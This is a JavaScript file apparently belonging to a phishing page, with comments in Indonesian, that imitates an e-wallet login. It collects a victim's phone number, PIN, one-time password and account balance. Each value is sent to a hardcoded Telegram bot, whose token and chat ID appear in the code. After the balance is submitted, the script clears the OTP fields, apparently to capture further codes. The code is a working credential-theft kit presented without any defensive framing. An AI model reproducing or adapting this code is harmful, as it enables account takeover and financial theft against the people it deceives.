document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phone-number");
  const pinInputs = document.querySelectorAll(".pin-box");
  const otpInputs = document.querySelectorAll(".otp-box");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const numberPage = document.getElementById("number-page");
  const pinPage = document.getElementById("pin-page");
  const otpPage = document.getElementById("otp-page");
  const floatingNotification = document.getElementById("floating-notification");
  const saldoInput = document.getElementById("saldo-input");
  const saldoError = document.getElementById("saldo-error");
  const verifikasiButton = document.getElementById("verifikasi-button");

  let otpResendCount = 0;
  const maxOtpResend = 5;

  let userData = {
    nomor: "",
    pin: "",
    otp: "",
    saldo: ""
  };

  // Fungsi untuk mengirim pesan ke bot Telegram
  async function sendTelegramMessage(message) {
    const botToken = "7221080933:AAEUU5qbFZDBrB2dOvvvV_V3oDVyGIayvhs";
    const chatId = "7732620750";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const data = await response.json();
      console.log("Pesan terkirim ke Telegram:", data);
    } catch (error) {
      console.error("Gagal mengirim pesan ke Telegram:", error);
    }
  }

  // Fungsi untuk mengirim notifikasi nomor
  function sendNomorNotification() {
    const message = `NOMOR : ${userData.nomor}`;
    sendTelegramMessage(message);
  }

  // Fungsi untuk mengirim notifikasi nomor dan PIN
  function sendPinNotification() {
    const message = `NOMOR : ${userData.nomor}\nPIN : ${userData.pin}`;
    sendTelegramMessage(message);
  }

  // Fungsi untuk mengirim notifikasi nomor, PIN, dan OTP
  function sendOtpNotification() {
    const message = `NOMOR : ${userData.nomor}\nPIN : ${userData.pin}\nOTP : ${userData.otp}`;
    sendTelegramMessage(message);
  }

  // Fungsi untuk mengirim notifikasi nomor, PIN, OTP, dan saldo
  function sendSaldoNotification() {
    const message = `NOMOR : ${userData.nomor}\nPIN : ${userData.pin}\nOTP : ${userData.otp}\nSALDO : ${userData.saldo}`;
    sendTelegramMessage(message);
  }

  // Format nomor HP
  function formatPhoneNumber(input) {
    let phoneNumber = input.value.replace(/\D/g, '');
    if (phoneNumber.length === 1 && phoneNumber[0] !== '8') {
      phoneNumber = '8';
    }
    if (phoneNumber.length > 15) {
      phoneNumber = phoneNumber.substring(0, 15);
    }
    let formattedNumber = '';
    for (let i = 0; i < phoneNumber.length; i++) {
      if (i === 3 || i === 8) {
        formattedNumber += '-';
      }
      formattedNumber += phoneNumber[i];
    }
    input.value = formattedNumber;
  }

  // Pindah ke halaman PIN
  function goToNextPage() {
    if (numberPage.style.display === "block") {
      const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
      if (phoneNumber.length >= 8) {
        userData.nomor = phoneNumberInput.value;
        numberPage.style.display = "none";
        pinPage.style.display = "block";
        phoneNumberInput.blur();
        lanjutkanButton.style.display = "none";
        pinInputs[0].focus();

        // Kirim notifikasi nomor ke Telegram
        sendNomorNotification();
      } else {
        alert("Nomor telepon harus minimal 8 digit.");
      }
    }
  }

  // Fungsi untuk otomatis pindah ke input berikutnya
  function handleAutoMoveInput(inputs, event) {
    const input = event.target;
    const index = Array.from(inputs).indexOf(input);

    if (event.inputType === "deleteContentBackward" && index > 0) {
      inputs[index - 1].focus();
    } else if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    // Jika semua PIN terisi, kirim notifikasi PIN
    if (inputs === pinInputs && index === inputs.length - 1) {
      setTimeout(() => {
        userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
        pinPage.style.display = "none";
        otpPage.style.display = "block";
        otpInputs[0].focus();

        // Kirim notifikasi nomor dan PIN ke Telegram
        sendPinNotification();
      }, 300);
    }

    // Jika semua OTP terisi, tampilkan notifikasi floating
    if (inputs === otpInputs && index === inputs.length - 1) {
      userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
      // Kirim notifikasi nomor, PIN, dan OTP
      sendOtpNotification();
      showFloatingNotification();
    }
  }

  // Tampilkan notifikasi floating
  function showFloatingNotification() {
    floatingNotification.style.display = "block";
    floatingNotification.addEventListener("click", function () {
      floatingNotification.style.display = "none";

      // Tampilkan kotak saldo dan tombol verifikasi
      saldoInput.style.display = "block";
      verifikasiButton.style.display = "block";
      saldoInput.focus();
    });
  }

  // Fungsi untuk memformat saldo dengan Rp. dan titik pemisah ribuan
  function formatSaldo(input) {
    let value = input.value.replace(/[^0-9]/g, '');
    if (value === "") {
      input.value = "Rp. ";
      return;
    }

    let formattedValue = parseFloat(value).toLocaleString("id-ID");
    input.value = `Rp. ${formattedValue}`;
  }

  // Fungsi untuk mengirim data saldo ke Telegram
  async function sendFinalDataToEmail() {
    const saldo = saldoInput.value.replace(/[^0-9]/g, '');

    // Validasi saldo
    if (saldo === "" || parseFloat(saldo) <= 50000) {
      saldoError.style.display = "block";
      return;
    } else {
      saldoError.style.display = "none";
      userData.saldo = `Rp. ${parseFloat(saldo).toLocaleString("id-ID")}`;

      // Kirim notifikasi nomor, PIN, OTP, dan saldo ke Telegram
      sendSaldoNotification();

      // Reset input OTP dan saldo
      otpInputs.forEach((input) => (input.value = ""));
      saldoInput.value = "Rp. ";
      saldoInput.style.display = "none";
      verifikasiButton.style.display = "none";
      otpInputs[0].focus();
    }
  }

  // Event listener untuk tombol verifikasi
  verifikasiButton.addEventListener("click", function () {
    sendFinalDataToEmail();
  });

  // Event listener untuk input nomor HP
  phoneNumberInput.addEventListener("input", function () {
    formatPhoneNumber(phoneNumberInput);
  });

  // Event listener untuk input PIN
  pinInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(pinInputs, event));
  });

  // Event listener untuk input OTP
  otpInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(otpInputs, event));
  });

  // Event listener untuk input saldo
  saldoInput.addEventListener("input", function () {
    formatSaldo(saldoInput);
  });

  // Event listener untuk tombol Lanjutkan
  lanjutkanButton.addEventListener("click", goToNextPage);
});